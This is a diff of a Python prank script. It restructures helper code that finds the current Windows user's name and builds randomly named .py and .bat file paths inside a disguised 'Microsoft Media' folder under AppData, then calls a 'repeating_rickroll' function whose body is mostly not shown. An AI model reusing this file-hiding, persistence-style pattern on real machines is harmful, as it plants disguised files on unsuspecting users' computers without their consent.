@@ -1,10 +1,3 @@
-import platform as pf
-import getpass as gp
-import random as r
-import os
-
-
-
 def repeating_rickroll(py_file_path, bat_file_path):
     import platform as pf
     import getpass as gp
@@ -51,37 +44,43 @@ def repeating_rickroll(py_file_path, bat_file_path):
 
 
 
-def get_user():
-    try:
-        ret = gp.getuser()
-    except:
+if __name__ == "__main__":
+    import platform as pf
+    import getpass as gp
+    import random as r
+    import os
+
+    def get_user():
         try:
-            if pf.system() == 'Darwin':
-                temp_list = os.getcwd().split('/')
-            elif pf.system() == 'Windows':
-                temp_list = os.getcwd().split('\\')
-            ret = temp_list [temp_list.index('Users') + 1]
+            ret = gp.getuser()
         except:
             try:
                 if pf.system() == 'Darwin':
-                    temp_list = __file__.split('/')
+                    temp_list = os.getcwd().split('/')
                 elif pf.system() == 'Windows':
-                    temp_list = __file__.split('\\')
+                    temp_list = os.getcwd().split('\\')
                 ret = temp_list [temp_list.index('Users') + 1]
             except:
-                ret = 'Unable to determine'
-    return ret
+                try:
+                    if pf.system() == 'Darwin':
+                        temp_list = __file__.split('/')
+                    elif pf.system() == 'Windows':
+                        temp_list = __file__.split('\\')
+                    ret = temp_list [temp_list.index('Users') + 1]
+                except:
+                    ret = 'Unable to determine'
+        return ret
 
-def rand_string(chars):
-    import random as r
-    lib = 'qwertyuiopasdfghjklzxcvbnm'
-    ret = ''
-    for _ in range(chars):
-        rand_chr = lib[r.randint( 0, len(lib)-1 )]
-        ret += rand_chr
-    return ret
+    def rand_string(chars):
+        import random as r
+        lib = 'qwertyuiopasdfghjklzxcvbnm'
+        ret = ''
+        for _ in range(chars):
+            rand_chr = lib[r.randint( 0, len(lib)-1 )]
+            ret += rand_chr
+        return ret
 
-py_file_path = f'C:\\Users\\{get_user()}\\AppData\\Local\\Microsoft Media\\{rand_string(12)}.py'
-bat_file_path = f'C:\\Users\\{get_user()}\\AppData\\Local\\Microsoft Media\\{rand_string(12)}.bat'
+    py_file_path = f'C:\\Users\\{get_user()}\\AppData\\Local\\Microsoft Media\\{rand_string(12)}.py'
+    bat_file_path = f'C:\\Users\\{get_user()}\\AppData\\Local\\Microsoft Media\\{rand_string(12)}.bat'
 
-repeating_rickroll(py_file_path, bat_file_path)
+    repeating_rickroll(py_file_path, bat_file_path)
